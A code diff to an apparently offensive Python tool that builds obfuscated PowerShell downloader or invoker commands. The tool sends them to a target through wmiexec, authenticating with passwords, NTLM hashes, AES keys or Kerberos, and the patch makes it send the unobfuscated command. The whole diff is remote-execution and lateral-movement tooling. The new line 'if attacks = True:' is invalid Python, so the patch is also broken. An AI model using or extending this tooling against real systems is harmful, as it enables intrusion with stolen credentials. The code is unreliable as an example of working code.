@@ -266,6 +266,7 @@ Create Pasteable Double Encoded Script:
     unprotected_command = ""
     hash = None
     methods = False
+    attacks = True
     method_dict = {}
 
     if aes != None:
@@ -321,7 +322,7 @@ Create Pasteable Double Encoded Script:
         execution = "invoker"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
-    if downloader:
+    elif downloader:
         execution = "downloader"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
@@ -333,6 +334,8 @@ Create Pasteable Double Encoded Script:
         execution = "group"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
+    else:
+        attacks = False
 
     if "invoker" in execution and not wmiexec_cmd:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
@@ -361,8 +364,12 @@ Create Pasteable Double Encoded Script:
             print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         if command == "cmd.exe":
             sys.exit("[!] You must provide a command or method of exploitation if you are using wmiexec")
-        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-        attack.run(target)
+        if attacks = True:
+            attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+            attack.run(target)
+        else:
+            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+            attack.run(target)
     elif smbexec_cmd:
         if hash:
             print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
